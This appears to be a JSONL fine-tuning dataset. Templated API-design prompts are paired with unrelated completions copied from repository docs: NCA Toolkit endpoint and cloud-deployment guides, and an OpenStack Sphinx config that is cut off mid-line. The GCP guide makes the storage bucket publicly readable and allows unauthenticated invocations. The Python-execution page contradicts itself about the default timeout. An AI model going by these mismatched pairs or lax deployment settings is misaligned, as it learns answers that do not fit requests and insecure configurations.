{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Adding New Routes\n\nThis document explains how to add new routes to the application using the dynamic route registration system.\n\n## Overview\n\nThe application now uses a dynamic route registration system that automatically discovers and registers all Flask blueprints in the `routes` directory. This means you no longer need to manually import and register blueprints in `app.py`.\n\n## How to Add a New Route\n\n1. **Create a new route file**\n\n   Create a new Python file in the appropriate location in the `routes` directory. For a v1 API endpoint, you would typically place it in a subdirectory under `routes/v1/` based on the functionality.\n\n   For example:\n   ```\n   routes/v1/email/send_email.py\n   ```\n\n2. **Define your Blueprint**\n\n   In your route file, define a Flask Blueprint with a unique name. Make sure to follow the naming convention:\n   \n   ```python\n   # routes/v1/email/send_email.py\n   from flask import Blueprint, request\n   from services.authentication import authenticate\n   from app_utils import queue_task_wrapper\n\n   v1_email_send_bp = Blueprint('v1_email_send', __name__)\n\n   @v1_email_send_bp.route('/v1/email/send', methods=['POST'])\n   @authenticate\n   @queue_task_wrapper(bypass_queue=False)\n   def send_email(job_id, data):\n       \"\"\"\n       Send an email\n       \n       Args:\n           job_id (str): Job ID assigned by queue_task_wrapper\n           data (dict): Request data containing email details\n       \n       Returns:\n           Tuple of (response_data, endpoint_string, status_code)\n       \"\"\"\n       # Your implementation here\n       endpoint = \"/v1/email/send\"\n       \n       # Return response\n       return {\"message\": \"Email sent\"}, endpoint, 200\n   ```\n\n3. **That's it!**\n\n   No need to modify `app.py`. The blueprint will be automatically discovered and registered when the application starts.\n\n## Naming Conventions\n\nWhen creating new routes, please follow these naming conventions:\n\n1. **Blueprint names**: Use the format `{version}_{category}_{action}_bp`\n   - Example: `v1_email_send_bp` for sending emails\n\n2. **Route paths**: Use the format `/{version}/{category}/{action}`\n   - Example: `/v1/email/send`\n\n3. **File structure**: Place files in directories that match the route structure\n   - Example: `routes/v1/email/send_email.py`\n\n## Testing Your Route\n\nAfter adding your route, restart the application and your new endpoint should be available immediately.\n\n## Troubleshooting\n\nIf your route isn't being registered:\n\n1. Check logs for any import errors\n2. Ensure your blueprint variable is defined at the module level\n3. Verify the blueprint name follows the naming convention\n4. Make sure your Python file is in the correct directory under `routes/` ", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docs/adding_routes.md", "language": "markdown", "complexity": "simple", "star_count": 1557, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 81}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Audio Concatenation API Endpoint Documentation\n\n## Overview\n\nThe `/v1/audio/concatenate` endpoint provides functionality to combine multiple audio files into a single audio file. This endpoint is part of the v1 API structure and is registered in the main application through the `v1_audio_concatenate_bp` Blueprint. It leverages the application's queuing system to handle asynchronous processing, which is particularly useful for potentially time-consuming audio processing operations.\n\n## Endpoint\n\n- **URL**: `/v1/audio/concatenate`\n- **Method**: `POST`\n\n## Request\n\n### Headers\n\n- `x-api-key`: Required. Your API authentication key.\n\n### Body Parameters\n\n| Parameter | Type | Required | Description |\n|-----------|------|----------|-------------|\n| `audio_urls` | Array | Yes | An array of objects, each containing an `audio_url` property pointing to an audio file to be concatenated. Must contain at least one item. |\n| `webhook_url` | String | No | A URL to receive a callback notification when processing is complete. If provided, the request will be processed asynchronously. |\n| `id` | String | No | A custom identifier for tracking the request. |\n\nEach object in the `audio_urls` array must have:\n- `audio_url`: String (URI format). The URL of an audio file to be concatenated.\n\n### Example Request\n\n```json\n{\n  \"audio_urls\": [\n    { \"audio_url\": \"https://example.com/audio1.mp3\" },\n    { \"audio_url\": \"https://example.com/audio2.mp3\" },\n    { \"audio_url\": \"https://example.com/audio3.mp3\" }\n  ],\n  \"webhook_url\": \"https://your-webhook-endpoint.com/callback\",\n  \"id\": \"custom-request-id-123\"\n}\n```\n\n### Example cURL Command\n\n```bash\ncurl -X POST \\\n  https://api.example.com/v1/audio/concatenate \\\n  -H 'Content-Type: application/json' \\\n  -H 'x-api-key: your-api-key-here' \\\n  -d '{\n    \"audio_urls\": [\n      { \"audio_url\": \"https://example.com/audio1.mp3\" },\n      { \"audio_url\": \"https://example.com/audio2.mp3\" }\n    ],\n    \"webhook_url\": \"https://your-webhook-endpoint.com/callback\",\n    \"id\": \"custom-request-id-123\"\n  }'\n```\n\n## Response\n\n### Synchronous Response (No webhook_url provided)\n\nIf no `webhook_url` is provided, the request will be processed synchronously and return:\n\n```json\n{\n  \"code\": 200,\n  \"id\": \"custom-request-id-123\",\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"response\": \"https://storage.example.com/combined-audio-file.mp3\",\n  \"message\": \"success\",\n  \"run_time\": 2.345,\n  \"queue_time\": 0,\n  \"total_time\": 2.345,\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"queue_length\": 0,\n  \"build_number\": \"1.0.123\"\n}\n```\n\n### Asynchronous Response (webhook_url provided)\n\nIf a `webhook_url` is provided, the request will be queued for processing and immediately return:\n\n```json\n{\n  \"code\": 202,\n  \"id\": \"custom-request-id-123\",\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"message\": \"processing\",\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"max_queue_length\": \"unlimited\",\n  \"queue_length\": 1,\n  \"build_number\": \"1.0.123\"\n}\n```\n\nWhen processing is complete, a webhook will be sent to the provided URL with the following payload:\n\n```json\n{\n  \"endpoint\": \"/v1/audio/concatenate\",\n  \"code\": 200,\n  \"id\": \"custom-request-id-123\",\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"response\": \"https://storage.example.com/combined-audio-file.mp3\",\n  \"message\": \"success\",\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"run_time\": 3.456,\n  \"queue_time\": 1.234,\n  \"total_time\": 4.690,\n  \"queue_length\": 0,\n  \"build_number\": \"1.0.123\"\n}\n```\n\n### Error Responses\n\n#### Invalid Request Format (400 Bad Request)\n\n```json\n{\n  \"code\": 400,\n  \"id\": null,\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"message\": \"Invalid request: 'audio_urls' is a required property\",\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"queue_length\": 0,\n  \"build_number\": \"1.0.123\"\n}\n```\n\n#### Authentication Error (401 Unauthorized)\n\n```json\n{\n  \"code\": 401,\n  \"message\": \"Invalid or missing API key\",\n  \"build_number\": \"1.0.123\"\n}\n```\n\n#### Queue Limit Reached (429 Too Many Requests)\n\n```json\n{\n  \"code\": 429,\n  \"id\": \"custom-request-id-123\",\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"message\": \"MAX_QUEUE_LENGTH (100) reached\",\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"queue_length\": 100,\n  \"build_number\": \"1.0.123\"\n}\n```\n\n#### Processing Error (500 Internal Server Error)\n\n```json\n{\n  \"code\": 500,\n  \"id\": \"custom-request-id-123\",\n  \"job_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"message\": \"Error downloading audio file: Connection refused\",\n  \"pid\": 12345,\n  \"queue_id\": 67890,\n  \"queue_length\": 0,\n  \"build_number\": \"1.0.123\"\n}\n```\n\n## Error Handling\n\n- **Missing Required Parameters**: If `audio_urls` is missing or empty, a 400 Bad Request response will be returned.\n- **Invalid URL Format**: If any `audio_url` is not a valid URI, a 400 Bad Request response will be returned.\n- **Authentication Failure**: If the API key is invalid or missing, a 401 Unauthorized response will be returned.\n- **Queue Limit**: If the queue is full (when MAX_QUEUE_LENGTH is set), a 429 Too Many Requests response will be returned.\n- **Processing Errors**: Any errors during audio download, processing, or upload will result in a 500 Internal Server Error response with details in the message field.\n\n## Usage Notes\n\n1. **Asynchronous Processing**: For long audio files, it's recommended to use the `webhook_url` parameter to process the request asynchronously.\n2. **File Formats**: The service supports common audio formats. The output will be in a standard format (typically MP3).\n3. **File Size**: There may be limits on the size of audio files that can be processed. Very large files might cause timeouts or failures.\n4. **Queue Behavior**: If the system is under heavy load, requests with `webhook_url` will be queued. The MAX_QUEUE_LENGTH environment variable controls the maximum queue size.\n\n## Common Issues\n\n1. **Inaccessible Audio URLs**: Ensure all audio URLs are publicly accessible. Private or authentication-required URLs will cause failures.\n2. **Incompatible Audio Formats**: Some exotic audio formats might not be supported. Stick to common formats like MP3, WAV, or AAC.\n3. **Webhook Failures**: If your webhook endpoint is unavailable when the processing completes, you might not receive the completion notification.\n4. **Timeout Issues**: Very large audio files might cause timeouts during download or processing.\n\n## Best Practices\n\n1. **Use Webhooks for Large Files**: Always use the webhook approach for large audio files or when concatenating many files.\n2. **Include an ID**: Always include a custom `id` parameter to help track your requests, especially in webhook responses.\n3. **Error Handling**: Implement robust error handling in your client application to handle various HTTP status codes.\n4. **Webhook Reliability**: Ensure your webhook endpoint is reliable and can handle retries if necessary.\n5. **File Preparation**: Pre-process your audio files to ensure they have compatible formats, sample rates, and channel configurations for best results.\n6. **Queue Monitoring**: Monitor the `queue_length` in responses to understand system load and adjust your request patterns if needed.", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docs/audio/concatenate.md", "language": "markdown", "complexity": "complex", "star_count": 1557, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 207}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Installing on Digital Ocean\n\nThis guide walks you through deploying the No-Code Architects Toolkit API on Digital Ocean's App Platform.\n\n## Prerequisites\n\n- A Digital Ocean account ([Sign up here](https://www.digitalocean.com/))\n- Basic familiarity with Digital Ocean App Platform\n- A credit/debit card for billing (you'll only be charged for what you use)\n\n## Step 1: Create a New Project\n\n1. Sign in to your Digital Ocean account\n2. Create a new project or select an existing one\n3. This will organize your resources for the NCA Toolkit\n\n## Step 2: Create a Digital Ocean Space\n\nYou'll need to create a Space (Digital Ocean's object storage) for the toolkit to store processed files:\n\n1. Navigate to **Spaces Object Storage** in the Digital Ocean dashboard\n2. Click **Create a Space**\n3. Select a region (e.g., New York)\n4. Give your bucket a name (e.g., `nca-toolkit-bucket`)\n5. Select your project\n6. Click **Create Space**\n\n## Step 3: Generate API Keys for Your Space\n\n1. From your new Space, go to **Settings**\n2. Click **Create Access Key**\n3. Select **Full Access**\n4. Give your key a name (e.g., `nca-toolkit-key`)\n5. Click **Create Access Key**\n6. **IMPORTANT**: Save both the Access Key and Secret Key shown - you will only see them once!\n7. Also copy the Space URL (endpoint) for use in the next step\n\n## Step 4: Deploy the App\n\n1. From your Digital Ocean dashboard, click **Create** and select **App**\n2. Choose **Container Image** as the deployment source\n3. Select **Docker Hub** for the repository\n4. Enter `stephengpope/no-code-architects-toolkit` as the image name\n5. Enter `latest` for the image tag\n6. Click **Next**\n7. If needed, edit the name to remove any extra dashes (Digital Ocean may show an error for long names)\n8. Choose **Web Service** as the service type\n\n## Step 5: Configure Resources\n\n1. Select a plan with adequate resources for your needs:\n   - For testing, a $50/month instance provides good performance\n   - For smaller workloads, you can select a smaller instance\n   - Note: You're only charged for the time the server is running\n2. Set Containers to 1\n3. Close the resource selection dialog\n\n## Step 6: Configure Environment Variables\n\nAdd the following environment variables exactly as shown (be careful with underscores vs. dashes and avoid any leading/trailing spaces):\n\n1. `API_KEY`: Your API key (e.g., `test123` for testing - change for production)\n2. `S3_ENDPOINT_URL`: The URL of your Space (copied from Step 3)\n3. `S3_ACCESS_KEY`: The access key from Step 3\n4. `S3_SECRET_KEY`: The secret key from Step 3\n5. `S3_BUCKET_NAME`: The name of your Space bucket (e.g., `nca-toolkit-bucket`)\n6. `S3_REGION`: The region code of your Space (e.g., `NYC3` for New York)\n\n## Step 7: Finalize and Deploy\n\n1. For Deployment Region, select a region close to your location (e.g., San Francisco)\n2. You can use the default app name or choose a custom name\n3. Click **Create Resource**\n4. Wait for the deployment to complete (this may take a few minutes)\n   - You may need to refresh the page to see updates\n\n## Step 8: Test Your Deployment\n\n### Using Postman\n\n1. Sign up for or log in to [Postman](https://www.postman.com/)\n2. Import the [NCA Toolkit Postman Collection](https://bit.ly/49Gkh61)\n3. Fork the collection to your workspace\n4. Create a new environment:\n   - Name it \"Digital Ocean\" or similar\n   - Add a variable `x-api-key` with the value matching your API_KEY (e.g., `test123`)\n   - Add a variable `base_url` with the value of your app's URL (shown in the Digital Ocean dashboard)\n   - Save the environment\n5. In the collection, navigate to the `toolkit/authenticate` endpoint and click Send\n6. If you receive a success response, your deployment is working correctly\n7. Then test the `toolkit/test` endpoint to verify complete functionality\n\n## Monitoring and Management\n\n- **Overview**: View basic information about your app\n- **Insights**: Monitor CPU and memory usage\n- **Runtime Logs**: View logs of API calls and server activity\n- **Console**: Access the server's command line (rarely needed)\n- **Settings**: Modify your app's configuration\n\n## Next Steps\n\nNow that you have successfully deployed the NCA Toolkit API, you can:\n- Explore all the available endpoints in the Postman collection\n- Integrate the API with your applications\n- Consider securing your API key with a more complex value\n- Scale your resources up or down based on your usage requirements\n\nRemember, Digital Ocean charges based on usage, so you can always delete the app when you're not using it to save costs.", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docs/cloud-installation/do.md", "language": "markdown", "complexity": "medium", "star_count": 1557, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 109}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Installing on the Google Cloud Platform (GCP)\n\n## 🎥 Video Instructions\n\nWatch **[Detailed Video Instructions](https://youtu.be/6bC93sek9v8)** to set up the No-Code Architects Toolkit API.\n\n- Use the **Docker Image** below:\n\n  ```\n  stephengpope/no-code-architects-toolkit:latest\n  ```\n\n### Video Resources\n\n- **[Postman Template](https://bit.ly/49Gkh61)**\n- **[NCA Toolkit API GPT](https://bit.ly/4feDDk4)** \n\nOr use the guide below walks you through the steps to install the NCA Toolkit API on GCP.\n\n---\n\n## **Prerequisites**\n- A Google Cloud account. [Sign up here](https://cloud.google.com/) if you don't already have one.\n  - New users receive $300 in free credits.\n- Basic knowledge of GCP services such as Cloud Run and Cloud Storage.\n- A terminal or code editor for managing files.\n\n---\n\n## **Step 1: Create a Google Cloud Project**\n1. Log into the [GCP Console](https://console.cloud.google.com/).\n2. Click on the **Project Selector** in the top navigation bar and select **New Project**.\n3. Enter a project name, such as `NCA Toolkit Project`.\n4. Click **Create**.\n\n---\n\n## **Step 2: Enable Required APIs**\nEnable the following APIs:\n- **Cloud Storage API**\n- **Cloud Storage JSON API**\n- **Cloud Run API**\n\n### **How to Enable APIs:**\n1. In the GCP Console, navigate to **APIs & Services** > **Enable APIs and Services**.\n2. Search for each API, click on it, and enable it.\n\n---\n\n## **Step 3: Create a Service Account**\n1. Navigate to **IAM & Admin** > **Service Accounts** in the GCP Console.\n2. Click **+ Create Service Account**.\n   - Enter a name (e.g., `NCA Toolkit Service Account`).\n3. Assign the following roles to the service account:\n   - **Storage Admin**\n   - **Viewer**\n4. Click **Done** to create the service account.\n5. Open the service account details and navigate to the **Keys** tab.\n   - Click **Add Key** > **Create New Key**.\n   - Choose **JSON** format, download the file, and store it securely.\n\n---\n\n## **Step 4: Create a Cloud Storage Bucket**\n1. Navigate to **Storage** > **Buckets** in the GCP Console.\n2. Click **+ Create Bucket**.\n   - Choose a unique bucket name (e.g., `nca-toolkit-bucket`).\n   - Leave default settings, but:\n     - Uncheck **Enforce public access prevention**.\n     - Set **Access Control** to **Uniform**.\n3. Click **Create** to finish.\n4. Go to the bucket permissions, and add **allUsers** as a principal with the role:\n   - **Storage Object Viewer**.\n5. Save changes.\n\n---\n\n## **Step 5: Deploy on Google Cloud Run**\n\n### 1. Navigate to Cloud Run\n- Open the **Cloud Run** service in the **Google Cloud Console**.\n\n### 2. Create a New Service\n- Click **Create Service**.\n- Then **Deploy one revision from Docker Hub using the image below**:\n\n  ```\n  stephengpope/no-code-architects-toolkit:latest\n  ```\n\n### 3. Allow Unauthenticated Invocations\n- Check the box to **allow unauthenticated invocations**.\n\n### 4. Configure Resource Allocation\n- Set **Memory**: `16 GB`.\n- Set **CPU**: `4 CPUs`.\n- Set **CPU Allocation**: **Always Allocated**.\n\n### 5. Adjust Scaling Settings\n- **Minimum Instances**: `0` (to minimize cost during idle times).\n- **Maximum Instances**: `5` (adjustable based on expected load).\n\n### 6. Use Second-Generation Servers\n- Scroll to **Platform Version** and select **Second Generation**.\n- Second-generation servers offer better performance and feature support for advanced use cases.\n\n### 7. Add Environment Variables\n- Add the following environment variables:\n- `API_KEY`: Your API key (e.g., `Test123`).\n- `GCP_BUCKET_NAME`: The name of your Cloud Storage bucket.\n- `GCP_SA_CREDENTIALS`: The JSON key of your service account.\n  - Paste the **entire contents** of the downloaded JSON key file into this field.\n  - Ensure:\n    - Proper JSON formatting.\n    - No leading or trailing spaces.\n\n### 8. Configure Advanced Settings\n- Set the **Container Port**: Default to `8080`.\n- **Request Timeout**: `300 seconds` (to handle long-running requests).\n- Enable **Startup Boost** to improve performance for the first request after a cold start.\n\n### 9. Deploy the Service\n- Verify all settings and click **Create**.\n- The deployment process might take a few minutes. Once completed, a green checkmark should appear in the Cloud Run dashboard.\n\nBy following these steps, the NCA Toolkit will be successfully deployed and accessible via Google Cloud Run with second-generation servers for optimal performance.\n\n---\n\n## **Step 6: Test the Deployment**\n\n1. Install **[Postman Template](https://bit.ly/49Gkh61)** on your computer.\n2. Import the API example requests from the NCA Toolkit GitHub repository.\n3. Configure two environment variables in Postman:\n   - `base_url`: Your deployed Cloud Run service URL.\n   - `x-api-key`: The API key you configured in **Step 5**.\n4. Use the example requests to validate that the API is functioning correctly.\n5. Use the **[NCA Toolkit API GPT](https://bit.ly/4feDDk4)** to learn more.\n\nBy following these steps, your NCA Toolkit API should be successfully deployed on Google Cloud Platform.", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docs/cloud-installation/gcp.md", "language": "markdown", "complexity": "medium", "star_count": 1557, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 140}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Execute Python Code Endpoint\n\n## 1. Overview\n\nThe `/v1/code/execute/python` endpoint allows users to execute Python code on the server. This endpoint is part of the version 1.0 API structure defined in `app.py`. It is designed to provide a secure and controlled environment for executing Python code, with features like input validation, output capturing, and timeout handling.\n\n## 2. Endpoint\n\n**URL Path:** `/v1/code/execute/python`\n**HTTP Method:** `POST`\n\n## 3. Request\n\n### Headers\n\n- `x-api-key` (required): The API key for authentication.\n\n### Body Parameters\n\nThe request body must be a JSON object with the following properties:\n\n- `code` (string, required): The Python code to be executed.\n- `timeout` (integer, optional): The maximum execution time in seconds, between 1 and 300. Default is 30 seconds.\n- `webhook_url` (string, optional): The URL to receive the execution result via a webhook.\n- `id` (string, optional): A unique identifier for the request.\n\nThe `validate_payload` directive in the routes file enforces the following JSON schema for the request body:\n\n```json\n{\n    \"type\": \"object\",\n    \"properties\": {\n        \"code\": {\"type\": \"string\"},\n        \"timeout\": {\"type\": \"integer\", \"minimum\": 1, \"maximum\": 300},\n        \"webhook_url\": {\"type\": \"string\", \"format\": \"uri\"},\n        \"id\": {\"type\": \"string\"}\n    },\n    \"required\": [\"code\"],\n    \"additionalProperties\": False\n}\n```\n\n### Example Request\n\n**Request Payload:**\n\n```json\n{\n    \"code\": \"print('Hello, World!')\",\n    \"timeout\": 10,\n    \"webhook_url\": \"https://example.com/webhook\",\n    \"id\": \"unique-request-id\"\n}\n```\n\n**cURL Command:**\n\n```bash\ncurl -X POST \\\n     -H \"x-api-key: YOUR_API_KEY\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"code\": \"print('Hello, World!')\", \"timeout\": 10, \"webhook_url\": \"https://example.com/webhook\", \"id\": \"unique-request-id\"}' \\\n     http://your-api-endpoint/v1/code/execute/python\n```\n\n## 4. Response\n\n### Success Response\n\nThe success response follows the general response format defined in `app.py`. Here's an example:\n\n```json\n{\n    \"endpoint\": \"/v1/code/execute/python\",\n    \"code\": 200,\n    \"id\": \"unique-request-id\",\n    \"job_id\": \"generated-job-id\",\n    \"response\": {\n        \"result\": null,\n        \"stdout\": \"Hello, World!\\n\",\n        \"stderr\": \"\",\n        \"exit_code\": 0\n    },\n    \"message\": \"success\",\n    \"pid\": 12345,\n    \"queue_id\": 1234567890,\n    \"run_time\": 0.123,\n    \"queue_time\": 0.0,\n    \"total_time\": 0.123,\n    \"queue_length\": 0,\n    \"build_number\": \"1.0.0\"\n}\n```\n\n### Error Responses\n\n#### Missing or Invalid Parameters\n\n**Status Code:** 400 Bad Request\n\n```json\n{\n    \"error\": \"Missing or invalid parameters\",\n    \"stdout\": \"\",\n    \"exit_code\": 400\n}\n```\n\n#### Execution Error\n\n**Status Code:** 400 Bad Request\n\n```json\n{\n    \"error\": \"Error message from the executed code\",\n    \"stdout\": \"Output from the executed code\",\n    \"exit_code\": 400\n}\n```\n\n#### Execution Timeout\n\n**Status Code:** 408 Request Timeout\n\n```json\n{\n    \"error\": \"Execution timed out after 10 seconds\"\n}\n```\n\n#### Internal Server Error\n\n**Status Code:** 500 Internal Server Error\n\n```json\n{\n    \"error\": \"An internal server error occurred\",\n    \"stdout\": \"\",\n    \"stderr\": \"\",\n    \"exit_code\": 500\n}\n```\n\n## 5. Error Handling\n\nThe endpoint handles various types of errors, including:\n\n- Missing or invalid parameters (400 Bad Request)\n- Execution errors, such as syntax errors or exceptions (400 Bad Request)\n- Execution timeout (408 Request Timeout)\n- Internal server errors (500 Internal Server Error)\n\nThe main application context (`app.py`) also includes error handling for queue overload (429 Too Many Requests) and other general errors.\n\n## 6. Usage Notes\n\n- The executed code runs in a sandboxed environment, with limited access to system resources.\n- The code execution is limited to a maximum of 300 seconds (5 minutes) by default, but this can be adjusted using the `timeout` parameter.\n- The execution result, including stdout, stderr, and the return value, is captured and returned in the response.\n- If a `webhook_url` is provided, the execution result will also be sent to the specified webhook.\n\n## 7. Common Issues\n\n- Attempting to execute code that accesses restricted resources or performs disallowed operations may result in an execution error.\n- Long-running or resource-intensive code may trigger the execution timeout.\n- Providing an invalid `webhook_url` will prevent the execution result from being delivered to the specified webhook.\n\n## 8. Best Practices\n\n- Always validate and sanitize user input to prevent code injection attacks.\n- Set an appropriate timeout value based on the expected execution time of the code.\n- Monitor the execution logs for any errors or unexpected behavior.\n- Implement rate limiting or queue management to prevent abuse or overload of the endpoint.\n- Consider implementing additional security measures, such as code sandboxing or whitelisting/blacklisting certain operations or modules.\n", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "docs/code/execute/execute_python.md", "language": "markdown", "complexity": "medium", "star_count": 1557, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 175}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# Key Manager API documentation build configuration file\n#\n# All configuration values have a default; values that are commented out\n# serve to show the default.\n\n# import sys\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n# sys.path.insert(0, os.path.abspath('.'))\n\n# -- General configuration ------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n# needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be\n# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom\n# ones.\nextensions = ['openstackdocstheme']\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The suffix of source filenames.\nsource_suffix = '.rst'\n\n# The encoding of source files.\n# source_encoding = 'utf-8-sig'\n\n# The master toctree document.\nmaster_doc = 'index'\n# General information about the project.\nproject = 'Key Manager API Guide'\nopenstackdocs_bug_tag = 'api-guide'\nopenstackdocs_repo_name = 'openstack/barbican'\nopenstackdocs_auto_name = False\nopenstackdocs_bug_project = 'barbican'\n\ncopyright = '2016, OpenStack contributors'\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n# language = None\n\n# There are two options for replacing |today|: either, you set today to some\n# non-false value, then it is used:\n# today = ''\n# Else, today_fmt is used as the format for a strftime call.\n# today_fmt = '%B %d, %Y'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\nexclude_patterns = []\n\n# The reST default role (used for this markup: `text`) to use for all\n# documents.\n# default_role = None\n\n# If true, '()' will be appended to :func: etc. cross-reference text.\n# add_function_parentheses = True\n\n# If true, the current module name will be prepended to all description\n# unit titles (such as .. function::).\n# add_module_names = True\n\n# If true, sectionauthor and moduleauthor directives will be shown in the\n# output. They are ignored by default.\n# show_authors = False\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = 'native'\n\n# A list of ignored prefixes for module index sorting.\n# modindex_common_prefix = []\n\n# If true, keep warnings as \"system message\" paragraphs in the built documents.\n# keep_warnings = False\n\n\n# -- Options for HTML output ----------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\nhtml_theme = 'openstackdocs'\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n# html_theme_options = {}\n\n# Add any paths that contain custom themes here, relative to this directory.\n# html_theme_path = []\n\n# The name for this set of Sphinx documents.  If None, it defaults to\n# \"<project> v<release> documentation\".\n# html_title = None\n\n# A shorter title for the navigation bar.  Default is the same as html_title.\n# html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32\n# pixels large.\n# html_favicon = None\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = []\n\n# Add any extra paths that contain custom files (such as robots.txt or\n# .htaccess) here, relative to this directory. These files are copied\n# directly to the root of the documentation.\n# html_extra_path = []\n\n# If true, SmartyPants will be used to convert quotes and dashes to\n# typographically correct entities.\n# html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n# html_sidebars = {}\n\n# Additional templates that should be rendered to pages, maps page names to\n# template names.\n# html_additional_pages = {}\n\n# If false, no module index is generated.\n# html_domain_indices = True\n\n# If false, no index is generated.\nhtml_use_index = True\n\n# If true, the index is split into individual pages for each letter.\n# html_split_index = False\n\n# If true, links to the reST sources are added to the pages.\n# html_show_sourcelink = True\n\n# If true, \"Created using Sphinx\" is shown in the HTML footer. Default is True.\n# html_show_sphinx = True\n\n# If true, \"(C) Copyright ...\" is shown in the HTML footer. Default is True.\n# html_show_copyright = True\n\n# If true, an OpenSearch description file will be output, and all pages will\n# contain a <link> tag referring to it.  The value of this option must be the\n# base URL from which the finished HTML is served.\n# html_use_opensearch = ''\n\n# This is the file name suffix for 